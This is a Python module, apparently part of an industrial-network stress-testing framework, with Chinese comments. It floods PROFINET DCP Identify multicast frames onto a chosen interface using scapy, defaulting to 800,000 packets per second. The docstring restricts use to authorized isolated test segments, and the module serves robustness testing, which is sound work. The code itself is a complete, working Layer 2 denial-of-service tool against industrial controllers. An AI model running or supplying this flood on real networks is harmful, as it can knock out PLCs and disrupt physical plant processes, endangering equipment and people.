"""
測項：PROFINET DCP Identify 廣播風暴
分類：PROFINET（Layer 2，EtherType 0x8892，Multicast 01:0e:cf:00:00:00）

重要限制：同 EtherCAT 測項——Layer 2 廣播，只能在受測、已授權的隔離實體網段上執行，
target 欄位僅供記錄，實際發送對象由 DCP 廣播 MAC 決定。
需求：scapy、且需要 root 或 CAP_NET_RAW 權限。
"""
import time

from ..common import RateLimiter, clamp_duration

NAME = "PROFINET DCP Identify 廣播風暴"
CATEGORY = "PROFINET"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # 流量型：DCP Identify 多播廣播洪水，靠封包速率本身造成負擔


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "rate_pps": {"type": "int", "default": 800000, "min": 1, "max": 800000, "desc": "每秒送出封包數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    rate = int(params.get("rate_pps", 4000))

    # DCP-Identify-ReqPDU：FrameID(0xFEFE) + ServiceID(0x05=Identify) + ServiceType(0x00=Request)
    # + Xid(4) + ResponseDelay(2) + DCPDataLength(2) + Block[Option=0xFF/Suboption=0xFF(All)/
    # BlockLength=0x0000]。依 IEC 61158-6-10 規範，Identify 多播請求必須附上「All Selector」
    # Block 才是合法可被解析的請求；沒有這個 Block 的訊框在多數真實 PROFINET 裝置堆疊上會被
    # 判定格式錯誤而直接忽略，使洪水失去測試「裝置對大量合法 Identify 請求的處理裕度」的意義。
    pkt = Ether(dst="01:0e:cf:00:00:00", type=0x8892) / Raw(
        load=b"\xfe\xfe\x05\x00\x04\x00\x00\x00\x00\x01\x00\x04\xff\xff\x00\x00"
    )
    limiter = RateLimiter(rate)
    sent = 0
    start = time.time()

    log_fn(f"[+] PROFINET DCP flood -> iface={iface}, {rate}pps, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # ValueError：scapy 在 iface 參數指向不存在的網路介面時丟出的例外類型，
            # 一併攔截以確保介面名稱打錯字等常見情境也能輸出乾淨的錯誤訊息，
            # 而不是讓例外原始 traceback 冒出來。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
